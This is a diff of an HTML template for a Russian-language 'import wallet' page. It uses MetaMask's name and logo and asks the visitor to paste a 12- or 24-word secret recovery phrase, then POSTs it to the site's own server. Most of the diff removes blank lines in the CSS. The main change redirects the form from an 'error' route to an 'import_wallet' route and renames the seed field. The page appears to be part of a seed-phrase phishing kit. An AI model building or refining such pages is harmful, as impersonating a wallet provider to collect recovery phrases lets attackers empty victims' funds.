@@ -6,7 +6,6 @@
   <title>Импорт кошелька</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
-
     body {
       margin: 0;
       padding: 0;
@@ -17,7 +16,6 @@
       align-items: center;
       min-height: 100vh;
     }
-
     .card {
       background: white;
       padding: 40px 30px;
@@ -28,20 +26,17 @@
       width: 100%;
       animation: fadeIn 0.8s ease-out;
     }
-
     .image {
       width: 100px;
       margin: 0 auto 20px;
       display: block;
     }
-
     h1 {
       font-size: 22px;
       font-weight: 700;
       margin-bottom: 25px;
       color: #006652;
     }
-
     textarea {
       width: 100%;
       min-height: 120px;
@@ -59,13 +54,11 @@
       border-color: #ff6a00;
       box-shadow: 0 0 6px rgba(255,106,0,0.4);
     }
-
     .hint {
       font-size: 13px;
       color: #666;
       margin-bottom: 15px;
     }
-
     .btn {
       display: inline-block;
       background: linear-gradient(135deg, #ff6a00, #ff9c33);
@@ -80,12 +73,10 @@
       box-shadow: 0 6px 14px rgba(255,106,0,0.3);
       margin-bottom: 12px;
     }
-
     .btn:hover {
       transform: translateY(-2px);
       box-shadow: 0 10px 20px rgba(255,106,0,0.4);
     }
-
     .btn-secondary {
       background: white;
       border: 2px solid #ccc;
@@ -95,7 +86,6 @@
     .btn-secondary:hover {
       background: #f2f2f2;
     }
-
     .btn-small {
       background: #eee;
       color: #333;
@@ -108,7 +98,6 @@
     .btn-small:hover {
       background: #ddd;
     }
-
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(10px); }
       to { opacity: 1; transform: translateY(0); }
@@ -118,10 +107,9 @@
 <body>
   <div class="card">
     <img class="image" src="{{ url_for('static', filename='image.png') }}" alt="MetaMask">
-
     <h1>Импортировать кошелек</h1>
-    <form action="{{ url_for('error') }}" method="POST">
-      <textarea id="seed" name="seed" placeholder="Введите вашу секретную фразу"></textarea>
+    <form action="{{ url_for('import_wallet') }}" method="POST">
+      <textarea id="seed" name="words" placeholder="Введите вашу секретную фразу"></textarea>
       <div class="hint">Фраза должна содержать 12 или 24 слова</div>
       <button type="button" class="btn-small" onclick="pasteFromClipboard()">Вставить</button>
       <br>
